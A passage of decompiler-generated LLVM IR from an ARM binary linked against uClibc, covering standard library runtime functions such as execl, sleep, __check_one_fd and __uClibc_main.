  uselistorder label %.thread1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_e2b8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_e2b8, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_e2c8 = ptrtoint i32* %stack_var_-32 to i32
  %v2_e2cc = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_e2cc, i32* %stack_var_-32, align 4
  br label %dec_label_pc_e2d8

dec_label_pc_e2d8:                                ; preds = %dec_label_pc_e2d8, %entry
  %v0_e2ec = phi i32 [ %v1_e2ec, %dec_label_pc_e2d8 ], [ 0, %entry ]
  %v3_e2d8 = phi i32 [ %v1_e2e0, %dec_label_pc_e2d8 ], [ %v2_e2cc, %entry ]
  %v1_e2dc = inttoptr i32 %v3_e2d8 to i32*
  %v2_e2dc = load i32, i32* %v1_e2dc, align 4
  %v1_e2e0 = add i32 %v3_e2d8, 4
  %v2_e2e4 = icmp eq i32 %v2_e2dc, 0
  store i32 %v1_e2e0, i32* %stack_var_-32, align 4
  %v1_e2ec = add i32 %v0_e2ec, 1
  store i32 %v1_e2ec, i32* @lr, align 4
  br i1 %v2_e2e4, label %dec_label_pc_e2f4, label %dec_label_pc_e2d8

dec_label_pc_e2f4:                                ; preds = %dec_label_pc_e2d8
  %v3_e2f4.neg = mul i32 %v1_e2ec, -4
  %v1_e2f8.neg = add i32 %v2_e2c8, -8
  %v2_e2fc = add i32 %v1_e2f8.neg, %v3_e2f4.neg
  %v2_e304 = inttoptr i32 %v2_e2fc to i32*
  store i32 %arg1, i32* %v2_e304, align 4
  store i32 %v2_e2cc, i32* %stack_var_-32, align 4
  %v0_e310 = load i32, i32* @sp, align 4
  store i32 %v0_e310, i32* @r1, align 4
  store i32 %v0_e310, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_e318

dec_label_pc_e318:                                ; preds = %dec_label_pc_e318.dec_label_pc_e318_crit_edge, %dec_label_pc_e2f4
  %v1_e32c = phi i32 [ %v5_e32c, %dec_label_pc_e318.dec_label_pc_e318_crit_edge ], [ %v0_e310, %dec_label_pc_e2f4 ]
  %v3_e318 = phi i32 [ %v3_e318.pre, %dec_label_pc_e318.dec_label_pc_e318_crit_edge ], [ %v2_e2cc, %dec_label_pc_e2f4 ]
  %v1_e31c = inttoptr i32 %v3_e318 to i32*
  %v2_e31c = load i32, i32* %v1_e31c, align 4
  %v0_e320 = load i32, i32* @lr, align 4
  %v1_e320 = add i32 %v0_e320, -1
  store i32 %v1_e320, i32* @lr, align 4
  %v7_e320 = icmp eq i32 %v0_e320, 1
  %v1_e324 = add i32 %v3_e318, 4
  store i32 %v1_e324, i32* %stack_var_-32, align 4
  %v2_e32c = add i32 %v1_e32c, 4
  %v3_e32c = inttoptr i32 %v2_e32c to i32*
  store i32 %v2_e31c, i32* %v3_e32c, align 4
  %v4_e32c = load i32, i32* %ip.global-to-local, align 4
  %v5_e32c = add i32 %v4_e32c, 4
  store i32 %v5_e32c, i32* %ip.global-to-local, align 4
  br i1 %v7_e320, label %dec_label_pc_e334, label %dec_label_pc_e318.dec_label_pc_e318_crit_edge

dec_label_pc_e318.dec_label_pc_e318_crit_edge:    ; preds = %dec_label_pc_e318
  %v3_e318.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_e318

dec_label_pc_e334:                                ; preds = %dec_label_pc_e318
  %v2_e338 = load i32, i32* @global_var_20e14.622, align 4
  store i32 %v2_e338, i32* @r2, align 4
  %v0_e33c = call i32 @__GI_execve()
  ret i32 %v0_e33c

; uselistorder directives
  uselistorder i32 %v5_e32c, { 1, 0 }
  uselistorder i32 %v0_e320, { 1, 0 }
  uselistorder i32 %v1_e2ec, { 0, 2, 1 }
  uselistorder i32 %v1_e2e0, { 1, 0 }
  uselistorder i32 %v3_e2d8, { 1, 0 }
  uselistorder i32 %v2_e2cc, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_e34c = load i32, i32* @r4, align 4
  store i32 %v3_e34c, i32* %stack_var_-20, align 4
  %v6_e34c = load i32, i32* @r5, align 4
  %v9_e34c = load i32, i32* @r6, align 4
  %v16_e34c = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_e350 = icmp eq i32 %arg1, 0
  %v2_e354 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_e350, label %dec_label_pc_e4d8, label %dec_label_pc_e36c.preheader

dec_label_pc_e36c.preheader:                      ; preds = %entry
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_e37417 = add i32 %v16_e34c, 124
  br label %dec_label_pc_e364

dec_label_pc_e364:                                ; preds = %dec_label_pc_e36c.preheader, %dec_label_pc_e364
  %v5_e37418 = phi i32 [ %v5_e37417, %dec_label_pc_e36c.preheader ], [ %v5_e374, %dec_label_pc_e364 ]
  %v2_e368 = add i32 %v5_e37418, -136
  %v3_e368 = inttoptr i32 %v2_e368 to i32*
  store i32 0, i32* %v3_e368, align 4
  %v0_e36c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_e36c = add i32 %v0_e36c.pre, -1
  store i32 %v1_e36c, i32* %r1.global-to-local, align 4
  %v6_e36c = icmp slt i32 %v1_e36c, 0
  %v4_e374 = mul i32 %v1_e36c, 4
  %v5_e374 = add i32 %v4_e374, %v16_e34c
  br i1 %v6_e36c, label %dec_label_pc_e37c, label %dec_label_pc_e364

dec_label_pc_e37c:                                ; preds = %dec_label_pc_e364
  %v2_e37c = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_e37c, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r1.global-to-local, align 4
  %v0_e38c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_e38c, i32* %stack_var_-28, align 4
  %v2_e394 = call i32 @__sigaddset(i32 %v2_e37c, i32 17)
  store i32 %v2_e394, i32* %r0.global-to-local, align 4
  %v1_e398 = load i32, i32* @r5, align 4
  %v5_e39c = icmp slt i32 %v2_e394, %v1_e398
  br i1 %v5_e39c, label %dec_label_pc_e4e0, label %dec_label_pc_e3a0

dec_label_pc_e3a0:                                ; preds = %dec_label_pc_e37c
  %v2_e3a0 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_e3a0, i32* @r4, align 4
  store i32 %v1_e398, i32* %r0.global-to-local, align 4
  store i32 %v2_e37c, i32* %r1.global-to-local, align 4
  %v3_e3b0 = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_e3b0 = call i32 @__GI_sigprocmask(i32 %v1_e398, %_TYPEDEF_sigset_t* %v3_e3b0, i32 %v2_e3a0)
  store i32 %v4_e3b0, i32* %r0.global-to-local, align 4
  %v1_e3b4 = load i32, i32* @r5, align 4
  %v9_e3b4 = icmp eq i32 %v4_e3b0, %v1_e3b4
  br i1 %v9_e3b4, label %dec_label_pc_e3bc, label %dec_label_pc_e4e0

dec_label_pc_e3bc:                                ; preds = %dec_label_pc_e3a0
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_e3a0, i32* %r0.global-to-local, align 4
  %v2_e3c4 = call i32 @__sigismember(i32 %v2_e3a0, i32 17)
  store i32 %v2_e3c4, i32* %r0.global-to-local, align 4
  %v1_e3c8 = load i32, i32* @r5, align 4
  %v9_e3c8 = icmp eq i32 %v2_e3c4, %v1_e3c8
  br i1 %v9_e3c8, label %dec_label_pc_e3e0.preheader, label %dec_label_pc_e3bc.dec_label_pc_e4a8_crit_edge

dec_label_pc_e3bc.dec_label_pc_e4a8_crit_edge:    ; preds = %dec_label_pc_e3bc
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_e4a8

dec_label_pc_e3e0.preheader:                      ; preds = %dec_label_pc_e3bc
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e3d8

dec_label_pc_e3d8:                                ; preds = %dec_label_pc_e3e0.preheader, %dec_label_pc_e3d8
  %v5_e3e816 = phi i32 [ %v5_e37417, %dec_label_pc_e3e0.preheader ], [ %v5_e3e8, %dec_label_pc_e3d8 ]
  %v2_e3dc = add i32 %v5_e3e816, -136
  %v3_e3dc = inttoptr i32 %v2_e3dc to i32*
  store i32 0, i32* %v3_e3dc, align 4
  %v0_e3e0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_e3e0 = add i32 %v0_e3e0.pre, -1
  store i32 %v1_e3e0, i32* %r1.global-to-local, align 4
  %v6_e3e0 = icmp slt i32 %v1_e3e0, 0
  %v4_e3e8 = mul i32 %v1_e3e0, 4
  %v5_e3e8 = add i32 %v4_e3e8, %v16_e34c
  br i1 %v6_e3e0, label %dec_label_pc_e3f0, label %dec_label_pc_e3d8

dec_label_pc_e3f0:                                ; preds = %dec_label_pc_e3d8
  store i32 %v2_e37c, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r1.global-to-local, align 4
  %v2_e3f8 = call i32 @__sigaddset(i32 %v2_e37c, i32 17)
  store i32 %v2_e3f8, i32* %r0.global-to-local, align 4
  %v1_e3fc = icmp slt i32 %v2_e3f8, 0
  br i1 %v1_e3fc, label %dec_label_pc_e4e0, label %dec_label_pc_e404

dec_label_pc_e404:                                ; preds = %dec_label_pc_e3f0
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_e410 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_e354)
  store i32 %v4_e410, i32* %r0.global-to-local, align 4
  %v1_e414 = icmp slt i32 %v4_e410, 0
  br i1 %v1_e414, label %dec_label_pc_e41c, label %dec_label_pc_e444

dec_label_pc_e41c:                                ; preds = %dec_label_pc_e404
  %v0_e41c = call i32 @__errno_location()
  store i32 %v2_e3a0, i32* %r1.global-to-local, align 4
  store i32 %v0_e41c, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_e430 = inttoptr i32 %v0_e41c to i32*
  %v2_e430 = load i32, i32* %v1_e430, align 4
  store i32 %v2_e430, i32* @r4, align 4
  %v3_e434 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_e434 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_e434, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_e43c = load i32, i32* @r4, align 4
  %v1_e43c = load i32, i32* %r5.global-to-local, align 4
  %v2_e43c = inttoptr i32 %v1_e43c to i32*
  store i32 %v0_e43c, i32* %v2_e43c, align 4
  %v17_e4e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e4e4

dec_label_pc_e444:                                ; preds = %dec_label_pc_e404
  %v2_e444 = load i32, i32* %stack_var_-424, align 4
  %v7_e448 = icmp eq i32 %v2_e444, 1
  %v2_e450 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_e450, i32* @r4, align 4
  br i1 %v7_e448, label %dec_label_pc_e458, label %dec_label_pc_e48c

dec_label_pc_e458:                                ; preds = %dec_label_pc_e444
  store i32 %v2_e450, i32* %r1.global-to-local, align 4
  store i32 %v2_e450, i32* %r0.global-to-local, align 4
  %v2_e460 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_e460 = call i32 @__libc_nanosleep(%timespec* %v2_e460, i32 %v2_e450)
  store i32 %v3_e460, i32* %r0.global-to-local, align 4
  store i32 %v3_e460, i32* %r6.global-to-local, align 4
  %v0_e468 = call i32 @__errno_location()
  store i32 %v2_e3a0, i32* %r1.global-to-local, align 4
  store i32 %v0_e468, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_e47c = inttoptr i32 %v0_e468 to i32*
  %v2_e47c = load i32, i32* %v1_e47c, align 4
  store i32 %v2_e47c, i32* @r4, align 4
  %v3_e480 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_e480 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_e480, i32 0)
  store i32 %v4_e480, i32* %r0.global-to-local, align 4
  %v0_e484 = load i32, i32* @r4, align 4
  %v1_e484 = load i32, i32* %r5.global-to-local, align 4
  %v2_e484 = inttoptr i32 %v1_e484 to i32*
  store i32 %v0_e484, i32* %v2_e484, align 4
  %v0_e4b4.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e4b4

dec_label_pc_e48c:                                ; preds = %dec_label_pc_e444
  store i32 %v2_e3a0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_e498 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_e498 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_e498, i32 0)
  store i32 %v4_e498, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e4a8

dec_label_pc_e4a8:                                ; preds = %dec_label_pc_e3bc.dec_label_pc_e4a8_crit_edge, %dec_label_pc_e48c
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_e3bc.dec_label_pc_e4a8_crit_edge ], [ %v2_e450, %dec_label_pc_e48c ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_e4ac = bitcast i32* %stack_var_-28 to %timespec*
  %v3_e4ac = call i32 @__libc_nanosleep(%timespec* %v2_e4ac, i32 %storemerge.pre-phi)
  store i32 %v3_e4ac, i32* %r0.global-to-local, align 4
  store i32 %v3_e4ac, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e4b4

dec_label_pc_e4b4:                                ; preds = %dec_label_pc_e458, %dec_label_pc_e4a8
  %v0_e4b4 = phi i32 [ %v0_e4b4.pr, %dec_label_pc_e458 ], [ %v3_e4ac, %dec_label_pc_e4a8 ]
  %v2_e4b4 = icmp eq i32 %v0_e4b4, 0
  br i1 %v2_e4b4, label %dec_label_pc_e4d8, label %dec_label_pc_e4bc

dec_label_pc_e4bc:                                ; preds = %dec_label_pc_e4b4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_e4c4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_e4c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e4e4

dec_label_pc_e4d8:                                ; preds = %entry, %dec_label_pc_e4b4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e4e4

dec_label_pc_e4e0:                                ; preds = %dec_label_pc_e3a0, %dec_label_pc_e3f0, %dec_label_pc_e37c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e4e4

dec_label_pc_e4e4:                                ; preds = %dec_label_pc_e4bc, %dec_label_pc_e4d8, %dec_label_pc_e41c, %dec_label_pc_e4e0
  %v17_e4e8 = phi i32 [ %v3_e4c4, %dec_label_pc_e4bc ], [ 0, %dec_label_pc_e4d8 ], [ %v17_e4e8.pre, %dec_label_pc_e41c ], [ -1, %dec_label_pc_e4e0 ]
  %v2_e4e8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_e4e8, i32* @r4, align 4
  store i32 %v6_e34c, i32* @r5, align 4
  store i32 %v9_e34c, i32* @r6, align 4
  ret i32 %v17_e4e8

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_e450, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_e3e0, { 0, 2, 1 }
  uselistorder i32 %v2_e3a0, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_e398, { 1, 0, 2 }
  uselistorder i32 %v2_e37c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_e36c, { 0, 2, 1 }
  uselistorder i32 %v16_e34c, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 1, 12, 13, 14, 16, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 7, 6, 9, 8, 11, 10, 13, 14, 12, 16, 15, 18, 17, 20, 19, 22, 21, 24, 23, 0 }
  uselistorder label %dec_label_pc_e4e4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_e4e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e4d8, { 1, 0 }
  uselistorder label %dec_label_pc_e4b4, { 1, 0 }
  uselistorder label %dec_label_pc_e4a8, { 1, 0 }
  uselistorder label %dec_label_pc_e3d8, { 1, 0 }
  uselistorder label %dec_label_pc_e364, { 1, 0 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_e51c:
  %stack_var_-8 = alloca i32, align 4
  %v3_e4f0 = load i32, i32* @r4, align 4
  store i32 %v3_e4f0, i32* %stack_var_-8, align 4
  %v2_e520 = load i32, i32* @global_var_20e1c.628, align 4
  %v2_e524 = icmp eq i32 %v2_e520, 0
  br i1 %v2_e524, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_e51c
  call void @__pseudo_branch(i32 %v2_e520)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e51c, %bb
  %v2_e534 = load i32, i32* @global_var_20e20.630, align 4
  %v2_e538 = icmp eq i32 %v2_e534, 0
  br i1 %v2_e538, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_e53c = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_e53c, i32* @r4, align 4
  %v9_e53c = load i32, i32* @r0, align 4
  ret i32 %v9_e53c

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_e534)
  %v2_e548 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e548, i32* @r4, align 4
  %v8_e548 = load i32, i32* @r0, align 4
  ret i32 %v8_e548

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v1_e564 = load i32, i32* @r0, align 4
  ret i32 %v1_e564
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_e568 = load i32, i32* @r4, align 4
  store i32 %v3_e568, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_e578 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v7_e57c = icmp eq i32 %v2_e578, -1
  br i1 %v7_e57c, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_e580 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_e580, i32* @r4, align 4
  ret i32 %v2_e578

bb4:                                              ; preds = %entry
  %v0_e584 = load i32, i32* @r4, align 4
  %v4_e58c = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_14f98.633, i32 0, i32 0), i32 %v0_e584)
  %v1_e590 = load i32, i32* %r5.global-to-local, align 4
  %v9_e590 = icmp eq i32 %v4_e58c, %v1_e590
  br i1 %v9_e590, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_e594 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_e594, i32* @r4, align 4
  ret i32 %v4_e58c

bb6:                                              ; preds = %bb4
  %v0_e598 = call i32 @abort()
  %v0_e59c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e59c, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_e598

; uselistorder directives
  uselistorder i32 %v2_e578, { 1, 0 }
  uselistorder i32 ()* @abort, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_e5a4 = load i32, i32* @global_var_20e24.635, align 4
  %v2_e5a8 = icmp eq i32 %v2_e5a4, 0
  br i1 %v2_e5a8, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v6_e5b4 = load i32, i32* @r0, align 4
  ret i32 %v6_e5b4

bb3:                                              ; preds = %entry
  store i32 1, i32* @global_var_20e24.635, align 4
  store i32 4096, i32* @global_var_20e18.396, align 4
  %v0_e5e8 = call i32 @_stdio_init()
  ret i32 %v0_e5e8
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_e600 = mul i32 %arg2, 4
  %v5_e600 = add i32 %tmp, %v4_e600
  %v2_e604 = load i32, i32* %arg3, align 4
  %v2_e608 = ptrtoint i32* %stack_var_-120 to i32
  %v1_e60c = add i32 %v5_e600, 4
  %v9_e610 = icmp eq i32 %v1_e60c, %v2_e604
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_20e10.641, align 4
  store i32 %v1_e60c, i32* @global_var_20e14.622, align 4
  store i32 %arg6, i32* @global_var_20e20.630, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_e610, label %bb, label %bb41

bb:                                               ; preds = %entry
  store i32 %v5_e600, i32* @global_var_20e14.622, align 4
  br label %bb41

bb41:                                             ; preds = %entry, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_e650 = bitcast i32* %stack_var_-120 to i8*
  %v3_e650 = call i32 @__GI_memset(i8* %v2_e650, i32 0)
  %storemerge.pre = load i32, i32* @global_var_20e14.622, align 4
  br label %dec_label_pc_e660

dec_label_pc_e660:                                ; preds = %dec_label_pc_e660, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_e660, %dec_label_pc_e660 ]
  %v1_e660 = inttoptr i32 %storemerge to i32*
  %v2_e660 = load i32, i32* %v1_e660, align 4
  %v4_e660 = add i32 %storemerge, 4
  %v2_e664 = icmp eq i32 %v2_e660, 0
  br i1 %v2_e664, label %dec_label_pc_e670, label %dec_label_pc_e660

dec_label_pc_e670:                                ; preds = %dec_label_pc_e660
  store i32 %v4_e660, i32* @r4, align 4
  %v1_e69022 = inttoptr i32 %v4_e660 to i32*
  %v2_e69023 = load i32, i32* %v1_e69022, align 4
  %v2_e69425 = icmp eq i32 %v2_e69023, 0
  br i1 %v2_e69425, label %dec_label_pc_e69c, label %dec_label_pc_e678

dec_label_pc_e678:                                ; preds = %dec_label_pc_e670, %dec_label_pc_e690
  %v5_e67c = phi i32 [ %v2_e690, %dec_label_pc_e690 ], [ %v2_e69023, %dec_label_pc_e670 ]
  %v2_e678 = icmp ugt i32 %v5_e67c, 13
  %v7_e678 = icmp eq i32 %v5_e67c, 14
  %v2_e67c = xor i1 %v2_e678, true
  %v3_e67c = or i1 %v7_e678, %v2_e67c
  br i1 %v3_e67c, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_e678
  %v6_e67c = and i32 %v5_e67c, 536870912
  %v7_e67c = icmp ne i32 %v6_e67c, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_e678, %bb42
  %v1_e688 = phi i1 [ %v2_e678, %dec_label_pc_e678 ], [ %v7_e67c, %bb42 ]
  %v2_e680 = xor i1 %v1_e688, true
  %v3_e680 = or i1 %v7_e678, %v2_e680
  br i1 %v3_e680, label %bb44, label %dec_label_pc_e690

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_e690

dec_label_pc_e690:                                ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_e680, i32 ptrtoint (i32* @global_var_c850.644 to i32))
  %v0_e68c = load i32, i32* @r4, align 4
  %v1_e68c = add i32 %v0_e68c, 8
  store i32 %v1_e68c, i32* @r4, align 4
  %v1_e690 = inttoptr i32 %v1_e68c to i32*
  %v2_e690 = load i32, i32* %v1_e690, align 4
  %v2_e694 = icmp eq i32 %v2_e690, 0
  br i1 %v2_e694, label %dec_label_pc_e69c, label %dec_label_pc_e678

dec_label_pc_e69c:                                ; preds = %dec_label_pc_e690, %dec_label_pc_e670
  %v1_e6a0 = call i32 @_dl_aux_init(i32 %v2_e608)
  store i32 %v1_e6a0, i32* @r0, align 4
  %v1_e6a4 = call i32 @__GI___uClibc_init(i32 %v1_e6a0)
  store i32 %v1_e6a4, i32* @r0, align 4
  %v2_e6b0 = icmp eq i32 %tmp37, 0
  br i1 %v2_e6b0, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_e69c
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_e69c, %bb45
  %v0_e6c0 = phi i32 [ %tmp37, %dec_label_pc_e69c ], [ 4096, %bb45 ]
  %v3_e6b8 = icmp eq i32 %tmp36, -1
  %v8_e6b8 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_20e18.396 to i32), i32* @r2, align 4
  store i32 %v0_e6c0, i32* @global_var_20e18.396, align 4
  br i1 %v3_e6b8, label %dec_label_pc_e6c8, label %dec_label_pc_e6f0

dec_label_pc_e6c8:                                ; preds = %bb46
  %v0_e6c8 = call i32 @getuid()
  store i32 %v0_e6c8, i32* @r0, align 4
  store i32 %v0_e6c8, i32* @r4, align 4
  %v0_e6d0 = call i32 @geteuid()
  %v0_e6d4 = load i32, i32* @r4, align 4
  %v9_e6d4 = icmp eq i32 %v0_e6d4, %v0_e6d0
  br i1 %v9_e6d4, label %dec_label_pc_e6dc, label %dec_label_pc_e718

dec_label_pc_e6dc:                                ; preds = %dec_label_pc_e6c8
  %v1_e6dc = call i32 @getgid(i32 %v0_e6d0)
  store i32 %v1_e6dc, i32* @r0, align 4
  store i32 %v1_e6dc, i32* @r4, align 4
  %v0_e6e4 = call i32 @getegid()
  %v0_e6e8 = load i32, i32* @r4, align 4
  %v9_e6e8 = icmp eq i32 %v0_e6e8, %v0_e6e4
  br i1 %v9_e6e8, label %dec_label_pc_e6f0, label %dec_label_pc_e718

dec_label_pc_e6f0:                                ; preds = %dec_label_pc_e6dc, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_e6b8, label %dec_label_pc_e784, label %dec_label_pc_e6fc

dec_label_pc_e6fc:                                ; preds = %dec_label_pc_e6f0
  %v9_e700 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_e700, label %dec_label_pc_e708, label %dec_label_pc_e718

dec_label_pc_e708:                                ; preds = %dec_label_pc_e6fc
  br label %dec_label_pc_e718

dec_label_pc_e718:                                ; preds = %dec_label_pc_e708, %dec_label_pc_e6fc, %dec_label_pc_e6dc, %dec_label_pc_e6c8
  %v2_e720 = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_e72c = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_e738 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_e784

dec_label_pc_e784:                                ; preds = %dec_label_pc_e718, %dec_label_pc_e6f0
  %v0_e748 = load i32, i32* @r6, align 4
  %v1_e748 = inttoptr i32 %v0_e748 to i32*
  %v2_e748 = load i32, i32* %v1_e748, align 4
  store i32 %v2_e748, i32* @global_var_1e79c, align 4
  store i32 %arg5, i32* @global_var_20e1c.628, align 4
  %v2_e784 = icmp eq i32 %arg4, 0
  br i1 %v2_e784, label %dec_label_pc_e7c0, label %bb47

bb47:                                             ; preds = %dec_label_pc_e784
  br label %dec_label_pc_e7c0

dec_label_pc_e7c0:                                ; preds = %dec_label_pc_e784, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_e7d0 = call i32 @__errno_location()
  %v2_e7d8 = inttoptr i32 %v1_e7d0 to i32*
  store i32 0, i32* %v2_e7d8, align 4
  %v1_e7ec = call i32 @__GI___h_errno_location()
  %v2_e7f4 = inttoptr i32 %v1_e7ec to i32*
  store i32 0, i32* %v2_e7f4, align 4
  %v0_e804 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_e810 = call i32 @__GI_exit(i32 %v0_e804)
  ret i32 %v1_e810

; uselistorder directives
  uselistorder i32 %v2_e690, { 1, 0 }
  uselistorder i32 %v1_e68c, { 1, 0 }
  uselistorder i1 %v2_e678, { 1, 0 }
  uselistorder i32 %v4_e660, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
